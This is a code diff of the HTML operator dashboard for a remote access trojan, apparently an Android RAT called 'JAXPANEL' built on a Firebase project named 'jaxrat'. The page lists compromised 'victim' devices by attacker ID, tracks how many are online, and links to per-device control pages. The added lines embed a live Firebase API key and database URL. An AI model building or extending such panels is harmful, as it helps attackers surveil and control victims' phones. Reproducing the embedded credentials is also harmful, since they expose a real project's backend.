@@ -1,58 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📊 Dashboard</title>
+    <title>📊 Dashboard - JAXPANEL</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script>
-        const firebaseConfig = { /* SAMA KAYAK DI ATAS */ };
+        // Gunakan Config Firebase lu yang sudah ada
+        const firebaseConfig = {
+            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
+            authDomain: "jaxrat-6813c.firebaseapp.com",
+            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
+            projectId: "jaxrat-6813c",
+            storageBucket: "jaxrat-6813c.firebasestorage.app",
+            messagingSenderId: "750985295231",
+            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
+        };
         firebase.initializeApp(firebaseConfig);
     </script>
     <style>
         body { background: #0a0e2a; color: white; font-family: 'Courier New'; margin: 0; padding: 20px; }
-        .navbar { display: flex; justify-content: space-between; background: #151e3d; padding: 10px 20px; border-bottom: 2px solid #00ffaa; }
-        .content { margin-top: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .navbar { display: flex; justify-content: space-between; align-items: center; background: #151e3d; padding: 10px 20px; border-bottom: 2px solid #00ffaa; }
+        .content { margin-top: 20px; display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px; }
         .card { background: #151e3d; border: 1px solid #00aaff; padding: 15px; border-radius: 5px; }
-        .device-list { background: #1e2745; padding: 10px; margin: 5px 0; cursor: pointer; border-left: 3px solid #00ffaa; }
-        .device-list:hover { background: #2a3460; }
+        .device-list { background: #1e2745; padding: 12px; margin: 8px 0; cursor: pointer; border-left: 4px solid #00ffaa; transition: 0.3s; }
+        .device-list:hover { background: #2a3460; transform: translateX(5px); }
+        .status-online { color: #00ffaa; font-weight: bold; }
+        .status-offline { color: #ff4d4d; font-weight: bold; }
+        h2, h3 { margin: 0 0 15px 0; color: #00ffaa; }
+        a { text-decoration: none; }
     </style>
 </head>
 <body>
     <div class="navbar">
         <h2>⚡ JAXPANEL [REU EDITION]</h2>
-        <div><span id="userEmail"></span> | <a href="profile.html" style="color:#00ffaa;">Profile</a> | <a href="#" onclick="logout()" style="color:red;">Logout</a></div>
+        <div>
+            <span id="userEmail">Loading...</span> | 
+            <a href="profile.html" style="color:#00ffaa;">Profile</a> | 
+            <a href="#" onclick="logout()" style="color:#ff4d4d; margin-left:10px;">Logout</a>
+        </div>
     </div>
+
     <div class="content">
         <div class="card">
-            <h3>📱 DEVICE ONLINE</h3>
-            <div id="deviceList">Loading...</div>
+            <h3>📱 DEVICE MONITOR</h3>
+            <div id="deviceList">Menghubungkan ke server...</div>
         </div>
+
         <div class="card">
             <h3>📊 QUICK STATS</h3>
-            <p>Total Victim: <span id="totalCount">0</span></p>
-            <p>Online: <span id="onlineCount">0</span></p>
-            <p>Last Update: <span id="lastUpdate">-</span></p>
+            <div style="font-size: 1.1em; line-height: 2;">
+                <p>Total Victim: <span id="totalCount" style="color:#00aaff;">0</span></p>
+                <p>Status Online: <span id="onlineCount" style="color:#00ffaa;">0</span></p>
+                <hr border="0" style="border-top:1px solid #333;">
+                <p style="font-size: 0.8em; color: #888;">Last Update: <span id="lastUpdate">-</span></p>
+            </div>
         </div>
     </div>
+
     <script>
-        const uid = firebase.auth().currentUser?.uid;
-        document.getElementById('userEmail').innerText = firebase.auth().currentUser?.email;
-        
-        // Ambil devices yang attacker_uid = uid user
-        const devicesRef = firebase.database().ref('devices');
-        devicesRef.orderByChild('attacker_uid').equalTo(uid).on('value', snap => {
-            let html = '';
-            snap.forEach(child => {
-                const data = child.val();
-                html += `<div class="device-list" onclick="window.location.href='device.html?id=${child.key}'">
-                    📟 ${data.deviceName || 'Unknown'} | ${data.model || '-'} | ${data.online ? '🟢' : '🔴'}
-                </div>`;
+        firebase.auth().onAuthStateChanged(user => {
+            if (!user) {
+                // Tendang ke login jika sesi habis atau belum login
+                window.location.href = 'index.html'; 
+                return;
+            }
+
+            const uid = user.uid;
+            document.getElementById('userEmail').innerText = user.email;
+            
+            // Listener Device List berdasarkan Attacker UID (Hanya device milik user ini)
+            const devicesRef = firebase.database().ref('devices');
+            devicesRef.orderByChild('attacker_uid').equalTo(uid).on('value', snap => {
+                let html = '';
+                let total = 0;
+                let online = 0;
+
+                if (snap.exists()) {
+                    snap.forEach(child => {
+                        const data = child.val();
+                        total++;
+                        
+                        let statusHtml = '';
+                        if (data.online) {
+                            online++;
+                            statusHtml = '<span class="status-online">🟢 Online</span>';
+                        } else {
+                            statusHtml = '<span class="status-offline">🔴 Offline</span>';
+                        }
+
+                        html += `
+                        <div class="device-list" onclick="window.location.href='device.html?id=${child.key}'">
+                            <strong>📟 ${data.deviceName || 'Victim-' + child.key.substring(0,5)}</strong><br>
+                            <small>${data.model || 'Unknown Device'} | ${statusHtml}</small>
+                        </div>`;
+                    });
+                }
+
+                // Update Tampilan
+                document.getElementById('deviceList').innerHTML = html || '<p style="padding:10px; color:#888;">Belum ada victim terhubung untuk akun ini.</p>';
+                document.getElementById('totalCount').innerText = total;
+                document.getElementById('onlineCount').innerText = online;
+                document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString();
             });
-            document.getElementById('deviceList').innerHTML = html || 'Belum ada victim';
         });
 
-        function logout() { firebase.auth().signOut().then(() => { window.location.href = 'index.html'; }); }
+        function logout() { 
+            if(confirm("Yakin mau keluar, Tuan?")) {
+                firebase.auth().signOut().then(() => { 
+                    window.location.href = 'index.html'; 
+                }); 
+            }
+        }
     </script>
 </body>
 </html>
